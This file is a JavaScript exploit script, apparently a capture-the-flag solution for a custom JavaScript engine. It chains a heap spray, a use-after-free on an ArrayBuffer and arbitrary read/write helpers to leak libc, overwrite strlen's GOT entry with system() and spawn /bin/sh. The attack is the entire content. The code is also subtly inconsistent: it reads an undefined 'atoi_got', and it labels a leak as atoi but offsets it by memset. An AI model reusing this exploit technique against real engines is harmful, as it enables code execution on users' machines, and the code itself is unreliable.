function pwn() {

  /* Helpers */
  var k_jsObjectSize = 0x70
  var __memset_got = 0x43e98
  var __libc_memset = 0x18eaf0
  var __libc_environ = 0x1ef2e0
  var __free_got = 0x4dde0
  var __je_free = 0x13b10

  var heapSpray = function(size, nums) {
    var s = []
    for(var i = 0; i < nums; i++) {
      s[i] = new Uint32Array(size)
      s[i].fill(0x41414141)
    }
  }
  var uaf = function(ab) {
    new Uint32Array(ab)
  }
  Number.prototype.hex = function() {
    return this.toString(16)
  }

  /* ====================================== Exploit ===================================== */
  heapSpray(k_jsObjectSize/4, 0x10)
  gc()

  var ab = new ArrayBuffer(k_jsObjectSize)
  uaf(ab)
  gc() /* ab->backingStore is a dangling pointer now */

  /* Replace UAF memory */
  var target_ta = []
  for(var i = 0; i < 0x100; i++) {
    target_ta.push(new Uint32Array(0x10))
    target_ta[i].fill(0x41414141)
  }

  var replaced = new Uint32Array(ab)
  var __codeleak_lower32 = replaced.get(2)
  var __codeleak_high32 = replaced.get(3)
  var __codebase = [__codeleak_high32, __codeleak_lower32 - 0x440a0] /* Sentinal addr */

  print('[*] code @ 0x' + __codebase[0].hex()+__codebase[1].hex())

  /* arbitrary read / write helper */
  var abRead = function(where) {
    replaced.set(8, where[1])
    replaced.set(9, where[0])
    for(var i = 0; i < 0x100; i++)  {
      if(target_ta[i].get(0) != 0x41414141)
        return [
          target_ta[i].get(0),
          target_ta[i].get(1)
        ]
    }
  }
  var abWrite = function(what, where) {
    replaced.set(8, where[1])
    replaced.set(9, where[0])
    for(var i = 0; i < 0x100; i++)
      if(target_ta[i].get(0) != 0x41414141) {
        target_ta[i].set(0, what[0])
        target_ta[i].set(1, what[1])
      }
  }

  var atoi = abRead([__codebase[0],__codebase[1]+atoi_got])
  var __libc_base = [atoi[1], atoi[0]-__libc_memset]

  print('[*] atoi @ 0x' + atoi[1].hex()+atoi[0].hex())
  print('[*] libc @ 0x'+__libc_base[0].hex()+__libc_base[1].hex())

  var __libc_system = 0x55410
  var system = [__libc_base[1]+__libc_system,__libc_base[0]]
  var __strlen_libc_got = [__libc_base[0],__libc_base[1]+0x1eb0a8]

  abWrite(system, __strlen_libc_got)
  print('/bin/sh')
  for(;;) {}
}
pwn()